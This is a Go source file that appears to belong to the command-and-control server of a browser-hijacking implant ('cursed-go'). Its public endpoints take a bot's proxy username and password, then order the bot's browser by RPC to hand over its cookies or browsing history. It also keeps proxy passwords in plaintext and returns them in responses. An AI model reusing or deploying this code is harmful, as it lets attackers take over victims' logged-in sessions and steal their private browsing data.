package api

import (
	"context"
	"errors"
	"net/http"
	"time"

	"gorm.io/gorm"

	"github.com/s045pd/cursed-go/internal/db/models"
)

// ProxyCredsAPI exposes endpoints used by *external* tools (the Chrome
// extension / proxy clients) to verify proxy credentials and snapshot
// browser data. They are public (no session) but rely on bot-level
// proxy_username/proxy_password for auth.
type ProxyCredsAPI struct {
	DB  *gorm.DB
	RPC BotRPC
}

type proxyCredReq struct {
	Username string `json:"username"`
	Password string `json:"password"`
	Method   string `json:"method,omitempty"`
}

// VerifyProxyCredentials is POST /api/v1/verify-proxy-credentials
func (a *ProxyCredsAPI) VerifyProxyCredentials(w http.ResponseWriter, r *http.Request) {
	var body proxyCredReq
	if !MustDecode(w, r, &body) {
		return
	}
	bot, err := a.findByCreds(body.Username, body.Password)
	if err != nil {
		JSONErr(w, http.StatusUnauthorized, "invalid proxy credentials")
		return
	}
	JSONOK(w, map[string]any{
		"id":             bot.ID,
		"is_online":      bot.IsOnline,
		"name":           bot.Name,
		"proxy_password": bot.ProxyPassword,
		"proxy_username": bot.ProxyUsername,
		"user_agent":     bot.UserAgent,
	})
}

// GetBotBrowserCookies is POST /api/v1/get-bot-browser-cookies
func (a *ProxyCredsAPI) GetBotBrowserCookies(w http.ResponseWriter, r *http.Request) {
	a.fetchVia(w, r, "GET_BROWSER_COOKIE_ARRAY", "cookies")
}

// GetBotBrowser is POST /api/v1/get-bot-browser
func (a *ProxyCredsAPI) GetBotBrowser(w http.ResponseWriter, r *http.Request) {
	a.fetchVia(w, r, "GET_BROWSER_HISTORY_ARRAY", "history")
}

func (a *ProxyCredsAPI) fetchVia(w http.ResponseWriter, r *http.Request, action, resultKey string) {
	var body proxyCredReq
	if !MustDecode(w, r, &body) {
		return
	}
	bot, err := a.findByCreds(body.Username, body.Password)
	if err != nil {
		JSONErr(w, http.StatusUnauthorized, "invalid proxy credentials")
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 30*time.Second)
	defer cancel()
	out, err := a.RPC.CallBot(ctx, bot.BrowserID, action, nil)
	if err != nil {
		if errors.Is(err, ErrBotOffline) {
			JSONErr(w, http.StatusBadGateway, "bot offline")
			return
		}
		JSONErr(w, http.StatusGatewayTimeout, err.Error())
		return
	}
	JSONOK(w, map[string]any{resultKey: out[resultKey]})
}

func (a *ProxyCredsAPI) findByCreds(user, pass string) (*models.Bot, error) {
	if user == "" || pass == "" {
		return nil, errors.New("missing creds")
	}
	var b models.Bot
	err := a.DB.Where("proxy_username = ? AND proxy_password = ?", user, pass).First(&b).Error
	if err != nil {
		return nil, err
	}
	return &b, nil
}
